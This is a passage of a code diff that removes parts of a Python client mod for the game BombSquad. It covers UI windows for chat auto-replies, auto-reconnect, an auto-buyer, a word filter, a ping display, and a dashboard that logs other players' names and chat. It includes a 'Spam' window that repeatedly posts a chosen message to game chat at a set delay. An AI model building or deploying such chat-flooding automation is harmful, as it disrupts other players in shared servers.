-        gs('swish').play()
-    def save(s):
-        value = tw(query=s.input).strip()
-        if not value: AR.err('Required!'); return
-        current = get_auto_replies()
-        current[s.keyword] = value
-        save_auto_replies(current)
-        bui.screenmessage(f'Saved!', color=(0, 1, 0)); gs('dingSmallHigh').play()
-        if s.parent_window:
-            try: s.parent_window.build_grid()
-            except: pass
-        AR.swish(s.w)
-    def delete(s):
-        current = get_auto_replies()
-        if s.keyword in current: del current[s.keyword]
-        save_auto_replies(current)
-        bui.screenmessage(f'Deleted!', color=(1, 0.5, 0)); gs('dingSmallLow').play()
-        if s.parent_window:
-            try: s.parent_window.build_grid()
-            except: pass
-        AR.swish(s.w)
-
-
-class AddAutoReplyWindow:
-    def __init__(s, source, parent_window=None):
-        s.parent_window = parent_window
-        s.w = AR.cw(source=source, size=(260, 210), ps=AR.UIS() * 0.3)
-        AR.add_close_button(s.w, position=(230, 175))
-        tw(parent=s.w, text='Add Auto Reply', scale=0.8, position=(130, 170), h_align='center', color=(1, 1, 0))
-        tw(parent=s.w, text='When contains:', scale=0.5, position=(130, 142), h_align='center', color=(1, 1, 1))
-        s.keyword_input = tw(parent=s.w, text='', editable=True, scale=0.8, position=(25, 112), size=(210, 28), h_align='center', color=(0.9, 0.9, 0.9))
-        tw(parent=s.w, text='Reply:', scale=0.5, position=(130, 85), h_align='center', color=(1, 1, 1))
-        s.response_input = tw(parent=s.w, text='', editable=True, scale=0.8, position=(25, 55), size=(210, 28), h_align='center', color=(0.9, 0.9, 0.9))
-        bw(parent=s.w, label='Add', size=(120, 30), position=(70, 10), on_activate_call=Call(s.save), color=(0.2, 0.7, 0.3), textcolor=(1, 1, 1), button_type='square', text_scale=0.7)
-        gs('swish').play()
-    def save(s):
-        keyword = tw(query=s.keyword_input).strip()
-        response = tw(query=s.response_input).strip()
-        if not keyword or not response: AR.err('Both required!'); return
-        current = get_auto_replies()
-        current[keyword] = response
-        save_auto_replies(current)
-        bui.screenmessage(f'Saved!', color=(0, 1, 0)); gs('dingSmallHigh').play()
-        if s.parent_window:
-            try: s.parent_window.build_grid()
-            except: pass
-        AR.swish(s.w)
-
-
-class AutoReplyEditorWindow:
-    def __init__(s, source, parent_window=None):
-        s.parent_window = parent_window
-        s.w = AR.cw(source=source, size=(300, 380), ps=AR.UIS() * 0.3)
-        AR.add_close_button(s.w, position=(270, 345))
-        tw(parent=s.w, text='Auto Reply', scale=0.9, position=(150, 340), h_align='center', color=(0, 1, 1))
-        s.scroll = sw(parent=s.w, size=(260, 160), position=(20, 145))
-        s.container = cw(parent=s.scroll, size=(240, 300), background=False)
-        s.item_buttons = {}
-        s.build_grid()
-        bw(parent=s.w, label='+ Add', size=(75, 26), position=(20, 108), on_activate_call=Call(s.add_new), color=(0.2, 0.7, 0.3), textcolor=(1, 1, 1), button_type='square', text_scale=0.55)
-        bw(parent=s.w, label='Clear', size=(75, 26), position=(105, 108), on_activate_call=Call(s.clear_all), color=(0.7, 0.3, 0.2), textcolor=(1, 1, 1), button_type='square', text_scale=0.55)
-        s.toggle_btn = bw(parent=s.w, label='ON' if auto_reply_enabled else 'OFF', size=(75, 26), position=(190, 108), on_activate_call=Call(s.toggle), color=(0.2, 0.7, 0.2) if auto_reply_enabled else (0.7, 0.2, 0.2), textcolor=(1, 1, 1), button_type='square', text_scale=0.7)
-        gs('swish').play()
-    def build_grid(s):
-        current = get_auto_replies()
-        for child in s.container.get_children(): child.delete()
-        s.item_buttons.clear()
-        items = list(current.items())
-        row_height = 30
-        total_h = len(items) * row_height + 20
-        for i, (keyword, response) in enumerate(items):
-            y = total_h - (i + 1) * row_height
-            btn = bw(parent=s.container, label=f'{keyword} -> {response}', size=(165, 24), position=(5, y), on_activate_call=Call(s.edit_item, keyword), color=(0.25, 0.4, 0.6), textcolor=(1, 1, 1), button_type='square', text_scale=0.45)
-            s.item_buttons[keyword] = btn
-            bw(parent=s.container, label='X', size=(25, 24), position=(175, y), on_activate_call=Call(s.delete_item, keyword), color=(0.7, 0.2, 0.2), textcolor=(1, 1, 1), button_type='square', text_scale=0.6)
-        cw(s.container, size=(240, total_h))
-    def add_new(s): AddAutoReplyWindow(s.w, parent_window=s)
-    def edit_item(s, keyword): EditAutoReplyWindow(s.w, keyword=keyword, parent_window=s)
-    def delete_item(s, keyword):
-        current = get_auto_replies()
-        if keyword in current: del current[keyword]
-        save_auto_replies(current)
-        bui.screenmessage(f'Deleted!', color=(1, 0.5, 0)); gs('dingSmallLow').play()
-        s.build_grid()
-    def clear_all(s):
-        save_auto_replies({})
-        bui.screenmessage('Cleared!', color=(1, 0.5, 0)); gs('dingSmallLow').play()
-        s.build_grid()
-    def toggle(s):
-        global auto_reply_enabled
-        auto_reply_enabled = not auto_reply_enabled
-        save_enabled_state('reply', auto_reply_enabled)
-        if auto_reply_enabled:
-            bw(s.toggle_btn, label='ON', color=(0.2, 0.7, 0.2)); bui.screenmessage('Reply ON', color=(0, 1, 0))
-        else:
-            bw(s.toggle_btn, label='OFF', color=(0.7, 0.2, 0.2)); bui.screenmessage('Reply OFF', color=(1, 0.5, 0))
-        gs('dingSmall').play()
-
-
-class SpamWindow:
-    def __init__(s, source):
-        saved_msg, saved_delay = get_spam_settings()
-        s.w = AR.cw(source=source, size=(280, 250), ps=AR.UIS() * 0.3)
-        AR.add_close_button(s.w, position=(255, 215))
-        tw(parent=s.w, text='Spam', scale=0.9, position=(140, 210), h_align='center', color=(1, 0.5, 0.5))
-        s.status = tw(parent=s.w, text='Not Spamming', position=(140, 175), h_align='center', scale=0.6, color=(1, 1, 0))
-        tw(parent=s.w, text='Message:', scale=0.5, position=(140, 155), h_align='center', color=(1, 1, 1))
-        s.msg_input = tw(parent=s.w, text=saved_msg, editable=True, scale=0.8, position=(25, 125), size=(230, 28), h_align='center', color=(0.9, 0.9, 0.9))
-        tw(parent=s.w, text='Delay (seconds):', scale=0.5, position=(140, 100), h_align='center', color=(1, 1, 1))
-        s.delay_input = tw(parent=s.w, text=str(saved_delay), editable=True, scale=0.8, position=(25, 70), size=(230, 28), h_align='center', color=(0.9, 0.9, 0.9))
-        s.toggle_btn = bw(parent=s.w, label='START', size=(110, 28), position=(20, 35), on_activate_call=Call(s.start), color=(0.2, 0.7, 0.3), textcolor=(1, 1, 1), button_type='square', text_scale=0.7)
-        bw(parent=s.w, label='STOP', size=(110, 28), position=(150, 35), on_activate_call=Call(s.stop), color=(0.7, 0.2, 0.2), textcolor=(1, 1, 1), button_type='square', text_scale=0.7)
-        gs('swish').play()
-    def start(s):
-        if spam_active: AR.err('Already!'); return
-        msg = tw(query=s.msg_input).strip()
-        if not msg: AR.err('Enter message!'); return
-        try:
-            delay = float(tw(query=s.delay_input).strip())
-            if delay <= 0: raise ValueError
-        except: AR.err('Invalid delay!'); return
-        start_spam(msg, delay)
-        tw(s.status, text=f'Spamming: {msg}', color=(0, 1, 0))
-        bw(s.toggle_btn, label='ON', color=(0.2, 0.7, 0.2))
-    def stop(s):
-        stop_spam(); tw(s.status, text='Stopped', color=(1, 1, 0))
-        bw(s.toggle_btn, label='START', color=(0.2, 0.7, 0.3))
-
-
-class ReconnectWindow:
-    def __init__(s, source):
-        global server_ip, server_port
-        server_ip, server_port = get_saved_server()
-
-        s.w = AR.cw(source=source, size=(300, 270), ps=AR.UIS() * 0.3)
-        AR.add_close_button(s.w, position=(270, 235))
-        tw(parent=s.w, text='Server Manager', scale=0.9, position=(150, 230), h_align='center', color=(0, 1, 1))
-
-        s.ip_text = tw(parent=s.w, text=f'IP: {server_ip}', position=(150, 195), h_align='center', scale=0.5, color=(0.8, 0.8, 1))
-        s.port_text = tw(parent=s.w, text=f'Port: {server_port}', position=(150, 178), h_align='center', scale=0.5, color=(0.8, 0.8, 1))
-
-        s.auto_btn = bw(parent=s.w, label='Auto Reconnect: ' + ('ON' if auto_reconnect_enabled else 'OFF'), size=(260, 32), position=(20, 138), on_activate_call=Call(s.toggle_auto), color=(0.2, 0.7, 0.2) if auto_reconnect_enabled else (0.7, 0.2, 0.2), textcolor=(1, 1, 1), button_type='square', text_scale=0.75)
-        tw(parent=s.w, text='Auto rejoin if disconnected', position=(150, 118), scale=0.35, h_align='center', color=(0.7, 0.7, 1))
-
-        tw(parent=s.w, text='Manual Connect:', scale=0.5, position=(150, 95), h_align='center', color=(1, 1, 1))
-        s.ip_input = tw(parent=s.w, text=server_ip, editable=True, scale=0.7, position=(25, 68), size=(115, 24), h_align='center', color=(0.9, 0.9, 0.9))
-        s.port_input = tw(parent=s.w, text=str(server_port), editable=True, scale=0.7, position=(160, 68), size=(115, 24), h_align='center', color=(0.9, 0.9, 0.9))
-
-        bw(parent=s.w, label='Connect', size=(120, 28), position=(90, 30), on_activate_call=Call(s.manual_connect), color=(0.3, 0.5, 0.8), textcolor=(1, 1, 1), button_type='square', text_scale=0.6)
-        bw(parent=s.w, label='Disconnect', size=(120, 28), position=(90, -3), on_activate_call=Call(s.disconnect), color=(0.7, 0.3, 0.3), textcolor=(1, 1, 1), button_type='square', text_scale=0.6)
-
-        s.status = tw(parent=s.w, text='Ready', position=(150, 158), h_align='center', scale=0.45, color=(0.8, 0.8, 1))
-
-        gs('swish').play()
-
-    def disconnect(s):
-        try:
-            conn = get_connection_info()
-            if conn:
-                original_disconnect()
-                bui.screenmessage('Disconnected', color=(1, 0.5, 0))
-                tw(s.status, text='Disconnected', color=(1, 0.5, 0))
-            else:
-                AR.err('Not connected!')
-        except Exception as e:
-            AR.err(f'Failed: {e}')
-
-    def manual_connect(s):
-        global server_ip, server_port
-        try:
-            ip = tw(query=s.ip_input).strip()
-            port = int(tw(query=s.port_input).strip())
-            server_ip = ip
-            server_port = port
-            save_server(ip, port)
-            tw(s.ip_text, text=f'IP: {server_ip}')
-            tw(s.port_text, text=f'Port: {server_port}')
-
-            conn = get_connection_info()
-            if conn:
-                try: original_disconnect()
-                except: pass
-                tw(s.status, text='Disconnecting...', color=(1, 1, 0))
-
-                def do_connect(attempt=0):
-                    if attempt > 60:
-                        tw(s.status, text='Failed', color=(1, 0, 0))
-                        return
-                    try:
-                        foreground = bascenev1.get_foreground_host_session()
-                        if isinstance(foreground, MainMenuSession):
-                            original_connect_to_party(ip, port)
-                            bui.screenmessage(f'Connected to {ip}:{port}', color=(0, 1, 0))
-                            tw(s.status, text='Connected', color=(0, 1, 0))
-                        else:
-                            teck(0.15, lambda: do_connect(attempt + 1))
-                    except Exception as e:
-                        teck(0.2, lambda: do_connect(attempt + 1))
-
-                teck(0.2, do_connect)
-            else:
-                original_connect_to_party(ip, port)
-                bui.screenmessage(f'Connected to {ip}:{port}', color=(0, 1, 0))
-                tw(s.status, text='Connected', color=(0, 1, 0))
-        except Exception as e:
-            AR.err(f'Failed: {e}')
-
-    def toggle_auto(s):
-        if auto_reconnect_enabled:
-            stop_auto_reconnect()
-            bw(s.auto_btn, label='Auto Reconnect: OFF', color=(0.7, 0.2, 0.2))
-        else:
-            start_auto_reconnect()
-            bw(s.auto_btn, label='Auto Reconnect: ON', color=(0.2, 0.7, 0.2))
-
-
-class AutoBuyerWindow:
-    def __init__(s, source):
-        s.w = AR.cw(source=source, size=(340, 360), ps=AR.UIS() * 0.3)
-        AR.add_close_button(s.w, position=(310, 325))
-        tw(parent=s.w, text='Auto Buyer', scale=0.95, position=(170, 320), h_align='center', color=(0, 1, 1))
-        status = "ON" if auto_buyer_enabled else "OFF"
-        status_color = (0, 1, 0) if auto_buyer_enabled else (1, 0, 0)
-        s.status_text = tw(parent=s.w, text=f'Status: {status}', position=(170, 290), h_align='center', scale=0.7, color=status_color)
-        s.toggle_btn = bw(parent=s.w, label='Turn OFF' if auto_buyer_enabled else 'Turn ON', size=(120, 26), position=(20, 258), on_activate_call=Call(s.toggle), color=(0.7, 0.2, 0.2) if auto_buyer_enabled else (0.2, 0.7, 0.2), textcolor=(1, 1, 1), button_type='square', text_scale=0.65)
-        bw(parent=s.w, label='Reset', size=(120, 26), position=(160, 258), on_activate_call=Call(s.reset_all), color=(0.7, 0.3, 0.2), textcolor=(1, 1, 1), button_type='square', text_scale=0.6)
-        tw(parent=s.w, text='Item Limits', position=(170, 232), h_align='center', scale=0.5, color=(1, 1, 0.8))
-        s.scroll = sw(parent=s.w, size=(300, 180), position=(20, 40))
-        s.container = cw(parent=s.scroll, size=(280, 700), background=False)
-        s.item_buttons = {}
-        s.build_grid()
-        gs('swish').play()
-    def build_grid(s):
-        current_limits = get_limits()
-        for child in s.container.get_children(): child.delete()
-        s.item_buttons.clear()
-        items = list(current_limits.items())
-        col_width = 140
-        row_height = 30
-        num_rows = (len(items) + 1) // 2
-        total_h = num_rows * row_height + 60
-        for i, (name, limit) in enumerate(items):
-            col = i % 2
-            row = i // 2
-            x = 5 + col * col_width
-            y = total_h - (row + 1) * row_height
-            limit_str = str(int(limit)) if limit == int(limit) else f"{limit:.2f}".rstrip('0').rstrip('.')
-            btn = bw(parent=s.container, label=f'{name}: {limit_str}', size=(130, 26), position=(x, y), on_activate_call=Call(s.edit_item, name), color=(0.25, 0.4, 0.6), textcolor=(1, 1, 1), button_type='square', text_scale=0.5)
-            s.item_buttons[name] = btn
-        cw(s.container, size=(280, total_h))
-    def refresh_list(s):
-        current_limits = get_limits()
-        for name, btn in s.item_buttons.items():
-            try:
-                if btn and btn.exists():
-                    limit = current_limits.get(name, 0)
-                    limit_str = str(int(limit)) if limit == int(limit) else f"{limit:.2f}".rstrip('.')
-                    bw(btn, label=f'{name}: {limit_str}')
-            except: pass
-    def toggle(s):
-        global auto_buyer_enabled
-        auto_buyer_enabled = not auto_buyer_enabled
-        save_enabled_state('buyer', auto_buyer_enabled)
-        if auto_buyer_enabled:
-            bw(s.toggle_btn, label='Turn OFF', color=(0.7, 0.2, 0.2))
-            tw(s.status_text, text='Status: ON', color=(0, 1, 0))
-            bui.screenmessage('Auto Buyer ON', color=(0, 1, 0))
-        else:
-            bw(s.toggle_btn, label='Turn ON', color=(0.2, 0.7, 0.2))
-            tw(s.status_text, text='Status: OFF', color=(1, 0, 0))
-            bui.screenmessage('Auto Buyer OFF', color=(1, 0.5, 0))
-        gs('dingSmall').play()
-    def edit_item(s, name):
-        EditLimitsWindow(s.w, item_name=name, parent_window=s)
-    def reset_all(s):
-        global _limits_cache
-        save_limits(dict(DEFAULT_LIMITS))
-        _limits_cache = None
-        bui.screenmessage('Reset!', color=(0, 1, 1)); gs('dingSmallHigh').play()
-        s.build_grid()
-
-
-class EditLimitsWindow:
-    def __init__(s, source, item_name, parent_window=None):
-        s.item_name = item_name; s.parent_window = parent_window
-        s.w = AR.cw(source=source, size=(260, 150), ps=AR.UIS() * 0.3)
-        AR.add_close_button(s.w, position=(230, 115))
-        current = str(get_limits().get(item_name, 0))
-        tw(parent=s.w, text=f'Set _ {item_name}', scale=0.8, position=(130, 110), h_align='center', color=(1, 1, 0))
-        s.input = tw(parent=s.w, text=current, editable=True, scale=0.9, position=(35, 70), size=(190, 28), h_align='center', color=(0.9, 0.9, 0.9))
-        tw(parent=s.w, text='(decimal allowed)', position=(130, 48), scale=0.4, h_align='center', color=(0.7, 0.7, 1))
-        bw(parent=s.w, label='Save', size=(100, 28), position=(80, 12), on_activate_call=Call(s.save), color=(0.2, 0.7, 0.3), textcolor=(1, 1, 1), button_type='square', text_scale=0.7)
-        gs('swish').play()
-    def save(s):
-        global _limits_cache
-        try: value = float(tw(query=s.input).strip())
-        except: AR.err('Invalid!'); return
-        current_limits = get_limits()
-        current_limits[s.item_name] = value
-        save_limits(current_limits)
-        _limits_cache = None
-        bui.screenmessage(f'Saved!', color=(0, 1, 0)); gs('dingSmallHigh').play()
-        if s.parent_window:
-            try: s.parent_window.build_grid()
-            except: pass
-        AR.swish(s.w)
-
-
-class FilterWindow:
-    def __init__(s, source):
-        s.w = AR.cw(source=source, size=(340, 280), ps=AR.UIS() * 0.3)
-        AR.add_close_button(s.w, position=(310, 245))
-
-        tw(parent=s.w, text='Word Filter', scale=1.0, position=(170, 240),
-           h_align='center', color=(0, 1, 1))
-
-        s.status_text = tw(parent=s.w, text='Filter: ON' if filter_enabled else 'Filter: OFF',
-                           scale=0.6, position=(170, 218),
-                           h_align='center',
-                           color=(0, 1, 0) if filter_enabled else (1, 0.5, 0))
-
-        tw(parent=s.w, text='Banned Words:', scale=0.55, position=(170, 195),
-           h_align='center', color=(1, 1, 1))
-
-        s.scroll = sw(parent=s.w, size=(300, 140), position=(20, 40))
-        s.container = cw(parent=s.scroll, size=(280, 400), background=False)
-        s.item_buttons = []
-        s.build_grid()
-
-        bw(parent=s.w, label='+ Add', size=(90, 28), position=(20, 5),
-           on_activate_call=s.add_word,
-           color=(0.2, 0.7, 0.3), textcolor=(1, 1, 1),
-           button_type='square', text_scale=0.7)
-
-        bw(parent=s.w, label='Clear All', size=(90, 28), position=(125, 5),
-           on_activate_call=s.clear_all,
-           color=(0.7, 0.3, 0.2), textcolor=(1, 1, 1),
-           button_type='square', text_scale=0.7)
-
-        s.toggle_btn = bw(parent=s.w, label='ON' if filter_enabled else 'OFF', size=(90, 28), position=(230, 5),
-                          on_activate_call=s.toggle,
-                          color=(0.2, 0.7, 0.2) if filter_enabled else (0.7, 0.2, 0.2),
-                          textcolor=(1, 1, 1), button_type='square', text_scale=0.75)
-
-        gs('swish').play()
-
-    def build_grid(s):
-        for child in s.container.get_children(): child.delete()
-        s.item_buttons.clear()
-
-        words = get_filter_words()
-        row_height = 30
-        total_h = len(words) * row_height + 20
-
-        if not words:
-            tw(parent=s.container, text='No banned words',
-               position=(140, 60), scale=0.7, color=(1, 0.5, 0),
-               h_align='center')
-        else:
-            for i, word in enumerate(words):
-                y = total_h - (i + 1) * row_height
-                tw(parent=s.container, text=f'{i+1}. {word}',
-                   position=(10, y), scale=0.6, color=(1, 1, 1),
-                   maxwidth=220, h_align='left')
-                bw(parent=s.container, label='X', size=(28, 24), position=(240, y),
-                   on_activate_call=lambda w=word: s.delete_word(w),
-                   color=(0.7, 0.2, 0.2), textcolor=(1, 1, 1),
-                   button_type='square', text_scale=0.6)
-
-        cw(s.container, size=(280, max(60, total_h)))
-
-    def add_word(s):
-        def _save():
-            w = tw(query=word_input).strip().lower()
-            if not w:
-                AR.err('Enter a word!')
-                return
-            words = get_filter_words()
-            if w in words:
-                AR.err('Word already exists!')
-                return
-            words.append(w)
-            save_filter_words(words)
-            bui.screenmessage(f'Added: {w}', color=(0, 1, 0))
-            gs('dingSmallHigh').play()
-            AR.swish(win)
-            s.build_grid()
-
-        win = AR.cw(source=s.w, size=(300, 160), ps=AR.UIS() * 0.3)
-        AR.add_close_button(win, position=(270, 125))
-        tw(parent=win, text='New Banned Word:', scale=0.7, position=(150, 120),
-           h_align='center', color=(1, 1, 1))
-        word_input = tw(parent=win, text='', editable=True, scale=0.85,
-                        position=(30, 75), size=(240, 30),
-                        h_align='center', color=(0.9, 0.9, 0.9))
-        bw(parent=win, label='Save', size=(100, 30), position=(100, 20),
-           on_activate_call=_save,
-           color=(0.2, 0.7, 0.3), textcolor=(1, 1, 1),
-           button_type='square', text_scale=0.7)
-
-    def delete_word(s, word):
-        words = get_filter_words()
-        if word in words:
-            words.remove(word)
-            save_filter_words(words)
-            bui.screenmessage(f'Removed: {word}', color=(1, 0.5, 0))
-            gs('dingSmallLow').play()
-            s.build_grid()
-
-    def clear_all(s):
-        save_filter_words([])
-        bui.screenmessage('Cleared!', color=(1, 0.5, 0))
-        gs('dingSmallLow').play()
-        s.build_grid()
-
-    def toggle(s):
-        global filter_enabled
-        filter_enabled = not filter_enabled
-        save_enabled_state('filter', filter_enabled)
-        if filter_enabled:
-            bw(s.toggle_btn, label='ON', color=(0.2, 0.7, 0.2))
-            tw(s.status_text, text='Filter: ON', color=(0, 1, 0))
-        else:
-            bw(s.toggle_btn, label='OFF', color=(0.7, 0.2, 0.2))
-            tw(s.status_text, text='Filter: OFF', color=(1, 0.5, 0))
-        gs('dingSmall').play()
-
-
-class EditPlaceWindow:
-    def __init__(s, source, mods_button):
-        s.mods_button = mods_button
-        s.step = 5
-
-        try:
-            pos = mods_button.get_position()
-            s.current_x, s.current_y = float(pos[0]), float(pos[1])
-        except:
-            s.current_x, s.current_y = 0.0, 0.0
-
-        s.parent_w, s.parent_h = 1920.0, 1080.0
-        try:
-            parent = mods_button.get_parent()
-            if parent:
-                psize = parent.get_size()
-                s.parent_w, s.parent_h = float(psize[0]), float(psize[1])
-        except:
-            pass
-
-        s.w = AR.cw(source=source, size=(340, 320), ps=AR.UIS() * 0.3)
-        AR.add_close_button(s.w, position=(310, 285))
-
-        tw(parent=s.w, text='Edit Button Place', scale=0.95, position=(170, 280),
-           h_align='center', color=(0, 1, 1))
-
-        s.pos_text = tw(parent=s.w, text=f'X: {int(s.current_x)}   Y: {int(s.current_y)}',
-                        position=(170, 235), h_align='center', scale=0.7,
-                        color=(1, 1, 0))
-
-        tw(parent=s.w, text=f'Step: {s.step}px',
-           position=(170, 215), h_align='center', scale=0.45,
-           color=(0.7, 0.7, 1))
-
-        arrow_size = (55, 45)
-        arrow_color = (0.3, 0.5, 0.8)
-        cx = 170
-
-        bw(parent=s.w, label='^', size=arrow_size,
-           position=(cx - 27, 155),
-           on_activate_call=s.move_up,
-           color=arrow_color, textcolor=(1, 1, 1),
-           button_type='square', text_scale=1.2)
-
-        bw(parent=s.w, label='<', size=arrow_size,
-           position=(cx - 110, 100),
-           on_activate_call=s.move_left,
-           color=arrow_color, textcolor=(1, 1, 1),
-           button_type='square', text_scale=1.2)
-
-        bw(parent=s.w, label='>', size=arrow_size,
-           position=(cx + 55, 100),
-           on_activate_call=s.move_right,
-           color=arrow_color, textcolor=(1, 1, 1),
-           button_type='square', text_scale=1.2)
-
-        bw(parent=s.w, label='v', size=arrow_size,
-           position=(cx - 27, 45),
-           on_activate_call=s.move_down,
-           color=arrow_color, textcolor=(1, 1, 1),
-           button_type='square', text_scale=1.2)
-
-        bw(parent=s.w, label='Reset to Default', size=(200, 32),
-           position=(70, 5),
-           on_activate_call=s.reset,
-           color=(0.7, 0.3, 0.2),
-           textcolor=(1, 1, 1), button_type='square', text_scale=0.7)
-
-        gs('swish').play()
-
-    def move_up(s):
-        s.current_y += s.step
-        s.apply_position()
-
-    def move_down(s):
-        s.current_y -= s.step
-        s.apply_position()
-
-    def move_left(s):
-        s.current_x -= s.step
-        s.apply_position()
-
-    def move_right(s):
-        s.current_x += s.step
-        s.apply_position()
-
-    def apply_position(s):
-        try:
-            max_x = max(0, s.parent_w - 128)
-            max_y = max(0, s.parent_h - 25)
-            if s.current_x < 0: s.current_x = 0
-            if s.current_y < 0: s.current_y = 0
-            if s.current_x > max_x: s.current_x = max_x
-            if s.current_y > max_y: s.current_y = max_y
-
-            bw(s.mods_button, position=(s.current_x, s.current_y))
-            tw(s.pos_text, text=f'X: {int(s.current_x)}   Y: {int(s.current_y)}')
-            save_mods_button_position(s.current_x, s.current_y)
-            gs('click01').play()
-        except Exception as e:
-            print(f"Move error: {e}")
-
-    def reset(s):
-        try:
-            default_x = s.parent_w - 150
-            default_y = s.parent_h - 155
-        except:
-            default_x, default_y = 0, 0
-
-        s.current_x, s.current_y = float(default_x), float(default_y)
-        s.apply_position()
-
-        bui.screenmessage('Reset!', color=(0, 1, 1))
-        gs('dingSmallHigh').play()
-
-
-
-# ============================================================
-# Ping (integrated into the Mods menu)
-# ============================================================
-def get_ping_icon(ping):
-    if ping == 0 or ping >= 999:
-        return "❓"
-    if ping < 100:
-        return "🔵"
-    if ping < 200:
-        return "⚪"
-    if ping < 350:
-        return "🟠"
-    return "🔴"
-
-
-class RealPingThread(threading.Thread):
-    def __init__(self):
-        super().__init__(daemon=True)
-        self.running = True
-
-    def run(self):
-        global current_ping
-        while self.running:
-            try:
-                # Only attempt a real ping when a non-default server is selected.
-                if server_ip != "127.0.0.1" or server_port != 43210:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    sock.settimeout(0.8)
-                    started = time.monotonic()
-                    try:
-                        sock.sendto(b'\x0b', (server_ip, int(server_port)))
-                        data, _ = sock.recvfrom(16)
-                        if data == b'\x0c':
-                            current_ping = round((time.monotonic() - started) * 1000.0, 2)
-                        else:
-                            current_ping = 999
-                    except socket.timeout:
-                        current_ping = 999
-                    except OSError:
-                        current_ping = 0
-                    finally:
-                        sock.close()
-                else:
-                    current_ping = 0
-            except Exception as exc:
-                current_ping = 0
-                print(f"[Ping] error: {exc}")
-            time.sleep(1.0)
-
-
-class PingWindow:
-    def __init__(self, source):
-        self.w = AR.cw(source=source, size=(280, 235), ps=AR.UIS() * 0.3)
-        AR.add_close_button(self.w, position=(250, 200))
-        tw(parent=self.w, text='Ping', scale=0.9, position=(140, 195),
-           h_align='center', color=(0, 1, 1))
-        self.ping_text = tw(
-            parent=self.w, text=f'Current: {current_ping:.2f} ms' if 0 < current_ping < 999 else 'Current: ? ms',
-            position=(140, 155), h_align='center', scale=0.75,
-            color=(1, 1, 0)
-        )
-        tw(parent=self.w, text='Server:', position=(140, 120),
-           h_align='center', scale=0.45, color=(0.8, 0.8, 1))
-        self.server_text = tw(
-            parent=self.w, text=f'{server_ip}:{server_port}',
-            position=(140, 98), h_align='center', scale=0.45,
-            color=(0.8, 0.8, 1)
-        )
-        AR.bw(
-            parent=self.w, label='Send Ping to Chat',
-            size=(190, 34), position=(45, 45),
-            on_activate_call=self.send_ping,
-            color=(0.2, 0.7, 0.3), text_scale=0.65
-        )
-        self.update_ping()
-
-    def update_ping(self):
-        try:
-            if not self.w.exists():
-                return
-            ping_value = f'{current_ping:.2f}' if 0 < current_ping < 999 else '?'
-            tw(self.ping_text, text=f'Current: {ping_value} ms')
-            tw(self.server_text, text=f'{server_ip}:{server_port}')
-            teck(0.5, self.update_ping)
-        except Exception:
-            pass
-
-    def send_ping(self):
-        try:
-            icon = get_ping_icon(current_ping)
-            value = '?' if current_ping <= 0 or current_ping >= 999 else f'{current_ping:.2f}'
-            message = f'My Ping : {icon} {value} ms'
-            CM(message)
-            push(f'Sent: {message}', color=(0, 1, 0))
-            try:
-                gs('dingSmallHigh').play()
-            except Exception:
-                pass
-        except Exception as exc:
-            push(f'Ping error: {exc}', color=(1, 0, 0))
-
-
-
-# ============================================================
-# Mahyar Dashboard: player, chat, alerts and server telemetry
-# ============================================================
-_PLAYER_HISTORY = {}
-_CHAT_STATS = {'messages': 0, 'senders': {}, 'recent': []}
-_ANALYTICS_LAST_MESSAGES = None
-_PING_HISTORY = []
-_ALERT_LOG = []
-_SESSION_STARTED = time.time()
-_SESSION_CONNECTIONS = 0
-_SESSION_CONNECTED = False
-_SESSION_PING_TOTAL = 0.0
-_SESSION_PING_COUNT = 0
-_LAST_ALERT_PING_STATE = None
-_LAST_ALERT_CONNECTION = None
-_ALERT_KEYWORDS = ['bslife', 'event', 'shop', 'giveaway']
-_FAVORITE_PLAYERS = set()
-_TELEMETRY_STARTED = False
-
-
-def _player_name(entry):
-    try:
-        players = entry.get('players', [])
-        if players:
-            return str(players[0].get('name_full') or players[0].get('name', '')).strip()
-        return str(entry.get('display_string', '')).strip()
-    except Exception:
-        return ''
-
-
-def _add_alert(message, color=(0.3, 0.9, 0.5)):
-    stamp = time.strftime('%H:%M:%S')
-    _ALERT_LOG.append(f'[{stamp}] {message}')
-    del _ALERT_LOG[:-40]
-    try:
-        push(f'Mahyar Alert: {message}', color=color)
-        gs('dingSmall').play()
-    except Exception:
-        pass
-
-
-def _telemetry_tick():
-    global _SESSION_CONNECTED, _SESSION_CONNECTIONS, _SESSION_PING_TOTAL, _ANALYTICS_LAST_MESSAGES
-    global _SESSION_PING_COUNT, _LAST_ALERT_PING_STATE, _LAST_ALERT_CONNECTION
-    try:
-        now = time.time()
-        try:
-            roster = get_roster() or []
-        except Exception:
-            roster = []
-        for entry in roster:
-            name = _player_name(entry)
-            if not name:
-                continue
-            rec = _PLAYER_HISTORY.setdefault(name, {'first': now, 'last': now, 'seen': 0})
-            rec['last'] = now
-            rec['seen'] += 1
-
-        connected = bool(get_connection_info())
-        if connected and not _SESSION_CONNECTED:
-            _SESSION_CONNECTIONS += 1
-            _add_alert('Connection established', (0.2, 0.9, 0.4))
-        elif not connected and _SESSION_CONNECTED:
-            _add_alert('Server disconnected', (1.0, 0.45, 0.2))
-        _SESSION_CONNECTED = connected
-        if _LAST_ALERT_CONNECTION is None:
-            _LAST_ALERT_CONNECTION = connected
-
-        ping = float(current_ping or 0)
-        if 0 < ping < 999:
-            _PING_HISTORY.append((now, ping))
-            del _PING_HISTORY[:-180]
-            _SESSION_PING_TOTAL += ping
-            _SESSION_PING_COUNT += 1
-            state = 'high' if ping >= 300 else 'normal'
-            if state == 'high' and _LAST_ALERT_PING_STATE != 'high':
-                _add_alert(f'High ping detected: {ping:.0f} ms', (1.0, 0.65, 0.15))
-            _LAST_ALERT_PING_STATE = state
-        else:
-            _PING_HISTORY.append((now, 999))
-            del _PING_HISTORY[:-180]
-
-        try:
-            messages = list(GCM() or [])
-            new_messages = _collect_new_messages(messages, _ANALYTICS_LAST_MESSAGES)
-            _ANALYTICS_LAST_MESSAGES = messages
-            for msg in new_messages:
-                if not isinstance(msg, str):
-                    continue
-                _CHAT_STATS['recent'].append(msg)
-                del _CHAT_STATS['recent'][:-30]
-                _CHAT_STATS['messages'] += 1
-                sender = msg.split(': ', 1)[0][:32] if ': ' in msg else 'Unknown'
-                _CHAT_STATS['senders'][sender] = _CHAT_STATS['senders'].get(sender, 0) + 1
-                body = msg.split(': ', 1)[-1].lower()
-                for keyword in _ALERT_KEYWORDS:
-                    if keyword and keyword.lower() in body:
-                        _add_alert(f'Keyword "{keyword}" in chat', (0.3, 0.8, 1.0))
-                        break
-        except Exception:
-            pass
-    except Exception as exc:
